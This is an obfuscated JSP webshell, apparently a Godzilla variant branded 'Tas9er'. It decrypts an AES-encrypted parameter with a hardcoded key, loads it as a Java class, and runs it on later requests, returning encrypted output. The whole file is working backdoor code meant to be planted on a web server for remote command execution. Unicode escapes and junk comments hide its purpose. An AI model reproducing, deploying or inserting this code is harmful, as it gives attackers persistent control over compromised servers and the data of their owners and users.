Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_rTx = "96a889ed5348794f";
    String govsb_ga4oc5 = "Tas9er";
    class govsb_A2v6HiJ extends /*edusb_4BjjWQWLX2Lw*/ClassLoader {
        public govsb_A2v6HiJ(ClassLoader govsb_omuWF57c6N) {
            super/*edusb_8Bk9fMTfqn*/(govsb_omuWF57c6N);
        }
        public Class govsb_yGL0(byte[] govsb_V) {
            return super./*edusb_DYpO5Vk*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_Qom*/(govsb_V, 40951-40951, govsb_V.length);
        }
    }
    public byte[] govsb_BDqre(byte[] govsb_rvctp, boolean govsb_j) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_1fWotnL*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_ivNKzNFQ = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_0sS4y6box3*/("AES");
            govsb_ivNKzNFQ.init(govsb_j?40951/40951:40951/40951+40951/40951,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_IJ3m9ImpggU*/SecretKeySpec/*edusb_QLS*/(govsb_rTx.getBytes(), "AES"));
            return govsb_ivNKzNFQ.doFinal/*edusb_WMN8V1*/(govsb_rvctp);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_cSrlba = java.util.Base64./*edusb_lU4rtAC1O*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_hQMRVvz7M*/decode(request.getParameter(govsb_ga4oc5));
        govsb_cSrlba = govsb_BDqre(govsb_cSrlba,false);
        if (session.getAttribute/*edusb_NPJA5Wb9F3X*/("payload") == null) {
            session.setAttribute("payload", new govsb_A2v6HiJ(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_OukhzYMIBEi1*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_g9KUSE*/.govsb_yGL0(govsb_cSrlba));
        } else {
            request.setAttribute("parameters", govsb_cSrlba);
            java.io.ByteArrayOutputStream govsb_d = new java.io./*edusb_p3oD*/ByteArrayOutputStream();
            Object govsb_h0NyOGdu0Nws = /*edusb_9XsJ*/((Class) session.getAttribute("payload"))./*edusb_CMtsiH*//*edusb_GIvVV3F3dgFrE*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_8dx*/;
            govsb_h0NyOGdu0Nws.equals(govsb_d);
            govsb_h0NyOGdu0Nws.equals(pageContext);
            response.getWriter().write("F8A95CF241D104D8189F6C6E92C007A5".substring(40951-40951, 16));
            govsb_h0NyOGdu0Nws.toString();
            response.getWriter().write(java.util.Base64/*edusb_ryXTokpwDIEpp*/.getEncoder()/*edusb_guGSMPw1xq*/.encodeToString(govsb_BDqre(govsb_d.toByteArray(),true)));
            response.getWriter().write("F8A95CF241D104D8189F6C6E92C007A5".substring(16));
        }
    } catch (Exception e) {
    }
%>